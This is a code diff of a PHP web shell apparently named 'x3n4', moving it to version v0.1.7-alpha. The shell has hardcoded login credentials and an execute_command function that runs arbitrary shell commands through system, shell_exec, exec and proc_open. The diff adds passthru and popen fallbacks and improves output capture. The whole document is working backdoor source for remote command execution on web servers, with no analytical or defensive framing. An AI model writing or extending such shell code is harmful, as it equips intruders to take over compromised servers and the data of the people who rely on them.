@@ -1,6 +1,6 @@
 <?php
 
-define('X3N4_VERSION', 'v0.1.6-alpha');
+define('X3N4_VERSION', 'v0.1.7-alpha');
 
 $user = 'x3n4';
 $password = 'P455W0rd';
@@ -40,15 +40,23 @@ function execute_command($command)
         case 'system':
             ob_start();
             @system($command);
-            $return = ob_get_contents();
+            $output = ob_get_contents();
             ob_end_clean();
-            return $return;
+            return $output;
 
         case 'shell_exec':
             return @shell_exec($command);
 
         case 'exec':
-            return @exec($command);
+            @exec($command, $outputArr, $code);
+            return implode(PHP_EOL, $outputArr);
+
+        case 'passthru':
+            ob_start();
+            @passthru($command, $code);
+            $output = ob_get_contents();
+            ob_end_clean();
+            return $output;
 
         case 'proc_open':
             $descriptors = array(
@@ -66,6 +74,12 @@ function execute_command($command)
             fclose($pipes[2]);
             $code = proc_close($process);
 
+            return $output;
+
+        case 'popen':
+            $process = popen($command . ' 2>&1', 'r');
+            $output = fread($process, 4096);
+            pclose($process);
             return $output;
 
         default:
